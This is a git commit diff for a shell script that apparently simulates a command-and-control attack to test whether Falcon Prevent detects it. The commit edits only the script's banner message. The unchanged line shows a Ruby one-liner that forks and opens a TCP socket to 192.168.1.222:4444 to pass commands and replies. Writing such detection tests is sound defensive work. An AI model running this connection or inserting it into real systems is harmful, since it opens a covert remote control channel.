c3c24f11ab35e2a76e34ec2f602df8aa1bf3a703
intelwolf <7601597+intelwolf@users.noreply.github.com>
2020-08-25 15:06:15 +0000

    Updates for version 1.7

--- bin/Command_Control_via_Remote_Access.sh
+++ bin/Command_Control_via_Remote_Access.sh
@@ -1,4 +1,4 @@
 #/bin/sh
 
-echo -e "\e[92mExecuting Command and Control via Ruby script. This script will try to connect to 192.168.1.222 and will exit at fork. A Falcon Prevent action can kill the attempt"
+echo -e "\e[92mExecuting Command and Control via Remote Access Tools using Ruby script. This script will try to connect to 192.168.1.222 and will exit at fork. A Falcon Prevent action can kill the attempt"
 ruby -rsocket -e'exit if fork;s=TCPSocket.new("192.168.1.222",4444);loop do;cmd=gets.chomp;s.puts cmd;s.close if cmd=="exit";puts s.recv(1000000);end' 
